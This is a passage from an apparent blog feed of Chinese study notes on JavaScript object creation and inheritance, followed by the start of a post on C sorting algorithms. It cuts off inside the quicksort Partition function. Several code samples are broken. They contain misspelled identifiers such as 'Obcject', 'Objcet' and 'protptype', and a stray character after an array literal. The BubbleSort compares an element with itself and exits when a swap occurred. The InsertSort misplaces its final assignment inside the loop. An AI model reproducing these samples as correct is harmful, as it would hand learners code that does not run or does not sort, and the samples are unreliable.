pKeys=<span class="hljs-title class_">Obcject</span>.<span class="hljs-title function_">keys</span>(p);<br></code></pre></td></tr></table></figure><h5 id="更简单的原型语法"><a href="#更简单的原型语法" class="headerlink" title="更简单的原型语法"></a>更简单的原型语法</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//简写prototype</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>)&#123;&#125;<br><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>=&#123;<br>    <span class="hljs-attr">name</span>:<span class="hljs-string">&quot;Martin&quot;</span>,<br>    <span class="hljs-attr">age</span>:<span class="hljs-number">29</span>,<br>    <span class="hljs-attr">job</span>:<span class="hljs-string">&quot;Software Engineer&quot;</span>,<br>    <span class="hljs-attr">sayName</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">//上面的代码里，将Person.prototype设置为一个字面量创建的新对象；但是此时constructor不再指向Person了；</span><br><span class="hljs-comment">//每创建一个函数，同时会创建他的prototype对象，这个对象自动获得constructor属性；</span><br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>=&#123;<br>    <span class="hljs-attr">constructor</span>:<span class="hljs-title class_">Person</span>,<br>    <span class="hljs-attr">name</span>:<span class="hljs-string">&quot;Martin&quot;</span>,<br>    <span class="hljs-attr">age</span>:<span class="hljs-number">29</span>,<br>    <span class="hljs-attr">job</span>:<span class="hljs-string">&quot;Software Engineer&quot;</span>,<br>    <span class="hljs-attr">sayName</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="组合使用：构造函数模式和原型模式"><a href="#组合使用：构造函数模式和原型模式" class="headerlink" title="组合使用：构造函数模式和原型模式"></a>组合使用：构造函数模式和原型模式</h5><blockquote><p>构造函数用于定义实例属性；原型模式用于定义方法和共享属性；</p><p>共享方法，但是每个实例有自己的属性副本；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age, job</span>)&#123; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">job</span> = job; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">friends</span> = [<span class="hljs-string">&quot;Shelby&quot;</span>, <span class="hljs-string">&quot;Court&quot;</span>]; <br>&#125; <br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = &#123; <br> constructor : <span class="hljs-title class_">Person</span>, <br> sayName : <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <br> <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <br> &#125; <br>&#125; <br></code></pre></td></tr></table></figure><h5 id="动态原型模式"><a href="#动态原型模式" class="headerlink" title="动态原型模式"></a>动态原型模式</h5><blockquote><p>通过将所有信息封装到构造函数，再构造函数中初始化原型；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age, job</span>)&#123; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">job</span> = job; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayName</span>!=<span class="hljs-string">&quot;function&quot;</span>)&#123;<br>        <span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayName</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><h5 id="寄生构造函数"><a href="#寄生构造函数" class="headerlink" title="寄生构造函数"></a>寄生构造函数</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age, job</span>)&#123; <br> <span class="hljs-keyword">var</span> o = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(); <br> o.<span class="hljs-property">name</span> = name; <br> o.<span class="hljs-property">age</span> = age; <br> o.<span class="hljs-property">job</span> = job; <br> o.<span class="hljs-property">sayName</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <br> <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <br> &#125;; <br> <span class="hljs-keyword">return</span> o; <br>&#125; <br><span class="hljs-keyword">var</span> friend = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Nicholas&quot;</span>, <span class="hljs-number">29</span>, <span class="hljs-string">&quot;Software Engineer&quot;</span>); <br>friend.<span class="hljs-title function_">sayName</span>(); <span class="hljs-comment">//&quot;Nicholas&quot; </span><br></code></pre></td></tr></table></figure><h3 id="3-继承"><a href="#3-继承" class="headerlink" title="3.继承"></a>3.继承</h3><ul><li>接口继承：只继承方法签名；</li><li>实现继承：继承实际方法；</li></ul><p>ES只支持实现继承，主要依靠原型链实现；</p><h4 id="（1）原型链"><a href="#（1）原型链" class="headerlink" title="（1）原型链"></a>（1）原型链</h4><blockquote><p>利用原型让一个引用类型继承另一个引用类型的属性和方法；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//原型链基本模式</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">property</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-title class_">SuperType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getSuperValue</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">property</span>;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">subproperty</span>=<span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SuperType</span>();<span class="hljs-comment">//子类的原型是父类的实例；子类获得父类的所有属性和方法；</span><br><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getSubValue</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">subproperty</span>;<br>&#125;;<br><br><span class="hljs-keyword">var</span> instacne=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instacne.<span class="hljs-title function_">getSuperValue</span>());<span class="hljs-comment">//true;</span><br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/606aeed6b87048a8.png"></p><ul><li>别忘记默认的原型</li></ul><blockquote><p>所有引用类型都默认继承Object；</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/03/11/ccdc684bf208d6d1.png"></p><ul><li>确定原型和实例的关系</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">instance <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>;<br><span class="hljs-title class_">Objcet</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-title function_">isPrototypeOf</span>(instance);<br></code></pre></td></tr></table></figure><ul><li>谨慎的定义代码</li></ul><blockquote><p>子类优势需要重写超类中的某个方法，或者添加超累不存在的某个方法；</p><p>不管怎样，给原型添加的代码一定要放在替换原型语句之后；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params"></span>)&#123; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">property</span> = <span class="hljs-literal">true</span>; <br>&#125; <br><span class="hljs-title class_">SuperType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getSuperValue</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">property</span>; <br>&#125;; <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params"></span>)&#123; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">subproperty</span> = <span class="hljs-literal">false</span>; <br>&#125; <br><br><span class="hljs-comment">//继承了 SuperType </span><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SuperType</span>(); <br><span class="hljs-comment">//!!!!添加新方法</span><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getSubValue</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">subproperty</span>; <br>&#125;; <br><span class="hljs-comment">//重写超类型中的方法</span><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getSuperValue</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>&#125;; <br><span class="hljs-keyword">var</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>(); <br><span class="hljs-title function_">alert</span>(instance.<span class="hljs-title function_">getSuperValue</span>()); <span class="hljs-comment">//false </span><br><br></code></pre></td></tr></table></figure><h5 id="Notice"><a href="#Notice" class="headerlink" title="Notice!!!"></a>Notice!!!</h5><p>使用原型链实现继承时，不能使用对象字面量创建原型方法；因为会重写原型链；</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params"></span>)&#123; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">property</span> = <span class="hljs-literal">true</span>; <br>&#125; <br><span class="hljs-title class_">SuperType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">getSuperValue</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">property</span>; <br>&#125;; <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params"></span>)&#123; <br> <span class="hljs-variable language_">this</span>.<span class="hljs-property">subproperty</span> = <span class="hljs-literal">false</span>; <br>&#125; <br><span class="hljs-comment">//继承了 SuperType </span><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SuperType</span>(); <br><span class="hljs-comment">//使用字面量添加新方法，会导致上一行代码无效</span><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = &#123; <br> getSubValue : <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">subproperty</span>; <br> &#125;, <br> someOtherMethod : <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br> &#125; <br>&#125;; <br><span class="hljs-keyword">var</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>(); <br><span class="hljs-title function_">alert</span>(instance.<span class="hljs-title function_">getSuperValue</span>()); <span class="hljs-comment">//error! </span><br></code></pre></td></tr></table></figure><ul><li>原型链的问题</li></ul><blockquote><p>问题来自于包含引用类型值的原型；</p><p>包含引用类型值的原型属性会被所有实例共享，这也是在构造函数而不是在原型对象中定义属性的原因；</p><p>在通过原型来实现继承时，原型实际上会变成另一个类型的实例；于是原先实例的属性也就变成了现在的原型属性了；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//定义了一个colors属性</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">colors</span>=[<span class="hljs-string">&#x27;red&#x27;</span>,<span class="hljs-string">&#x27;grenn&#x27;</span>]l<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params"></span>)&#123;<br>    <br>&#125;<br><br><span class="hljs-comment">//子类原型设为父类</span><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property">protptype</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SuperType</span>();<br><span class="hljs-keyword">var</span> instance1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>();<br><span class="hljs-comment">//所有的子都会共享colors；</span><br>instance1.<span class="hljs-property">colors</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;black&#x27;</span>);<br><span class="hljs-title function_">alert</span>(instance1.<span class="hljs-property">colors</span>);<span class="hljs-comment">//red\gren\black</span><br><br><span class="hljs-keyword">var</span> instance2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>();<br><span class="hljs-title function_">alert</span>(instance2.<span class="hljs-property">colors</span>);<span class="hljs-comment">//red\green\black</span><br></code></pre></td></tr></table></figure><h4 id="（2）借用构造函数"><a href="#（2）借用构造函数" class="headerlink" title="（2）借用构造函数"></a>（2）借用构造函数</h4><blockquote><p>伪造对象或者经典继承；</p><p>在子类构造函数的内部调用超类型构造函数；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//定义了一个colors属性</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">colors</span>=[<span class="hljs-string">&#x27;red&#x27;</span>,<span class="hljs-string">&#x27;grenn&#x27;</span>]l<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">SuperType</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);<span class="hljs-comment">//继承了supertype；实际上在未来新创建的SubType实例时调用SuperType的构造函数；</span><br>&#125;<br><br><span class="hljs-keyword">var</span> ins=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>();<br>ins.<span class="hljs-property">colors</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;black&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ins.<span class="hljs-property">colors</span>);<span class="hljs-comment">//red.green.black;</span><br><span class="hljs-keyword">var</span> ins2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ins2.<span class="hljs-property">colors</span>);<span class="hljs-comment">//red.green;//不会共享colors了；</span><br><br></code></pre></td></tr></table></figure><h5 id="传递参数-1"><a href="#传递参数-1" class="headerlink" title="传递参数"></a>传递参数</h5><blockquote><p>相比于原型链，借用构造函数有一个很大的优势，可以在子类型构造函数中向超累型构造函数传递参数；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//定义了一个colors属性</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=name;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">SuperType</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>,<span class="hljs-string">&quot;Martin&quot;</span>);<span class="hljs-comment">//调用父类构造函数实际上为子类的实例设置了name属性；</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>=<span class="hljs-number">29</span>;<span class="hljs-comment">//为了确保父类构造函数不会重写子类的属性，可以在调用父类构造函数忠厚添加子类定义的属性；</span><br>&#125;<br><br><span class="hljs-keyword">var</span> ins=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ins.<span class="hljs-property">name</span>);<span class="hljs-comment">//Martin</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ins.<span class="hljs-property">age</span>);<span class="hljs-comment">//29</span><br><br></code></pre></td></tr></table></figure><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><blockquote><p>仅仅借用构造函数，无法避免构造函数模式存在的问题：方法都在构造函数中定义，无法函数复用；</p><p>超类原型定义的方法对子类而言也是不可见得；</p></blockquote><h4 id="（3）组合继承"><a href="#（3）组合继承" class="headerlink" title="（3）组合继承"></a>（3）组合继承</h4><blockquote><p>组合继承：有时叫伪经典继承，指将原型链和借用构造函数的技术组合到一块儿，发挥二者之长的继承模式；</p><p>背后的思路是使用原型链实现对原型属性和方法的继承，通过借用构造函数来实现对实例属性的继承；</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>JS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>排序</title>
    <link href="/2021/08/31/Ch8%E6%8E%92%E5%BA%8F/"/>
    <url>/2021/08/31/Ch8%E6%8E%92%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><h2 id="一、插入排序"><a href="#一、插入排序" class="headerlink" title="一、插入排序"></a>一、插入排序</h2><p>每次将一个待排序的记录插入到前面已经排序的序列；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">InsertSort</span><span class="hljs-params">(RecordType R[],<span class="hljs-type">int</span> num)</span><br>&#123;<br>    <span class="hljs-type">int</span> index1,index2;<br><br>    <span class="hljs-keyword">for</span>(index1=<span class="hljs-number">2</span>;index1&lt;=num;index1++)<br>    &#123;<br>       R[<span class="hljs-number">0</span>]=R[index1];<br>       index2=index1<span class="hljs-number">-1</span>;<br>       <span class="hljs-keyword">while</span>(R[<span class="hljs-number">0</span>].key&lt;R[index2].key)<br>       &#123;<br>           R[index2+<span class="hljs-number">1</span>]=R[index2];<br>           index2--;<br>           R[index2+<span class="hljs-number">1</span>]=R[<span class="hljs-number">0</span>];<br>       &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>适用于一个基本有序的序列，n^2,稳定的；</p><h2 id="二、希尔排序"><a href="#二、希尔排序" class="headerlink" title="二、希尔排序"></a>二、希尔排序</h2><p>又名缩小增量排序，按照下标增量分成若干个子序列，对每个子序列进行直接插入排序；一轮结束后缩小增量，划分子序列；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">ShellSort</span><span class="hljs-params">(RecordType R[],<span class="hljs-type">int</span> num)</span><br>&#123;<br>    <span class="hljs-type">int</span> index1,index2;<br>    <span class="hljs-type">int</span> increasement;    <span class="hljs-comment">//增量</span><br><br>    <span class="hljs-keyword">for</span>(increasement=num/<span class="hljs-number">2</span>;increasement&gt;<span class="hljs-number">0</span>;increasement=increasement/<span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(index1=increasement+<span class="hljs-number">1</span>;index1&lt;=num;index1++)<br>        &#123;<br>            R[<span class="hljs-number">0</span>]=R[index1];<br>            index2=index1-increasement;<br>            <span class="hljs-keyword">while</span>(index2&gt;=<span class="hljs-number">0</span>&amp;&amp;R[<span class="hljs-number">0</span>].key&lt;R[index2].key)<br>            &#123;<br>                R[index2+increasement]=R[index2];<br>                index2=index2-increasement;<br>            &#125;<br>            R[index2+increasement]=R[<span class="hljs-number">0</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>空间复杂度O（1），适合大批量杂乱无章的数据序列，不稳定；</p><h2 id="三、冒泡排序"><a href="#三、冒泡排序" class="headerlink" title="三、冒泡排序"></a>三、冒泡排序</h2><p>每一轮按序比较相邻的两个数据，每一轮将最大的一个或最小的一个排序到最后；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">BubbleSort</span><span class="hljs-params">(RecordType r[],<span class="hljs-type">int</span> num)</span><br>&#123;<br>    <span class="hljs-type">int</span> index1,index2;<br>    <span class="hljs-type">int</span> isExchange;<br>    <span class="hljs-keyword">for</span>(index1=<span class="hljs-number">1</span>;index1&lt;num;index1++)<br>    &#123;<br>        isExchange=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(index2=<span class="hljs-number">1</span>;index2&lt;=num<span class="hljs-number">-1</span>;index2++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(r[index2].key&gt;r[index2].key)<br>            &#123;<br>                r[<span class="hljs-number">0</span>]=r[index2+<span class="hljs-number">1</span>];<br>                r[index2+<span class="hljs-number">1</span>]=r[index2];<br>                r[index2]=r[<span class="hljs-number">0</span>];<br>                isExchange=<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(isExchange)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>时间复杂度O（n^2）,空间复杂度O（1），稳定的；</p><h2 id="四、快速排序"><a href="#四、快速排序" class="headerlink" title="四、快速排序"></a>四、快速排序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Partition</span><span class="hljs-params">(RecordType R[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span><br>&#123;<br>    R[<span 